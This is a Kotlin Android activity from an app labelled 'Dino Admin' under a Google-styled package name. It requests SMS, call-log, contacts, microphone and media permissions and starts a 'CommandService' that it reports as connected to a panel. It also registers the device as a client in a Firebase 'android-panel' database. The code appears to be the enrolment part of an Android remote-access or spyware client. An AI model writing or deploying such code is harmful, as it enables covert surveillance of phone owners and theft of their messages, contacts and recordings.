package com.google.dino.admin

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {
    
    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var startServiceBtn: Button
    private lateinit var sendInfoBtn: Button
    
    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO
        )
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Initialize views
        statusText = findViewById(R.id.status_text)
        deviceIdText = findViewById(R.id.device_id_text)
        startServiceBtn = findViewById(R.id.start_service_btn)
        sendInfoBtn = findViewById(R.id.send_info_btn)
        
        // Get device ID
        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        
        deviceIdText.text = "Device ID: $deviceId"
        
        // Check permissions
        checkPermissions()
        
        // Button click listeners
        startServiceBtn.setOnClickListener {
            startCommandService()
        }
        
        sendInfoBtn.setOnClickListener {
            sendDeviceInfoToFirebase(deviceId)
        }
    }
    
    private fun checkPermissions() {
        val missingPermissions = mutableListOf<String>()
        
        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission)
            }
        }
        
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        } else {
            statusText.text = "All permissions granted"
            startCommandService()
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            
            if (allGranted) {
                statusText.text = "Permissions granted. Starting service..."
                startCommandService()
            } else {
                Toast.makeText(
                    this,
                    "Some permissions denied. App may not work fully.",
                    Toast.LENGTH_LONG
                ).show()
                statusText.text = "Partial permissions. Some features disabled."
            }
        }
    }
    
    private fun startCommandService() {
        val serviceIntent = Intent(this, CommandService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        statusText.text = "Service started. Connected to panel."
    }
    
    private fun sendDeviceInfoToFirebase(deviceId: String) {
        try {
            val database = FirebaseDatabase.getInstance(
                "https://android-panel-61c66-default-rtdb.europe-west1.firebasedatabase.app"
            )
            val deviceRef = database.getReference("clients").child(deviceId)
            
            val deviceInfo = hashMapOf<String, Any>(
                "deviceId" to deviceId,
                "modelName" to Build.MODEL,
                "androidv" to Build.VERSION.RELEASE,
                "sdkV" to Build.VERSION.SDK_INT.toString(),
                "status" to true,
                "joined" to SimpleDateFormat("dd/MM/yyyy | hh:mm a", Locale.getDefault())
                    .format(Date()),
                "label" to "Dino Admin Device",
                "storage" to "Unknown",
                "battery" to "Unknown",
                "ip_address" to "Unknown",
                "isRoot" to false,
                "isSdCard" to false,
                "sims" to "1"
            )
            
            deviceRef.updateChildren(deviceInfo)
                .addOnSuccessListener {
                    Toast.makeText(this, "Device info sent to panel", Toast.LENGTH_SHORT).show()
                }
                .addOnFailureListener {
                    Toast.makeText(this, "Failed to send device info", Toast.LENGTH_SHORT).show()
                }
                
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
    }
}
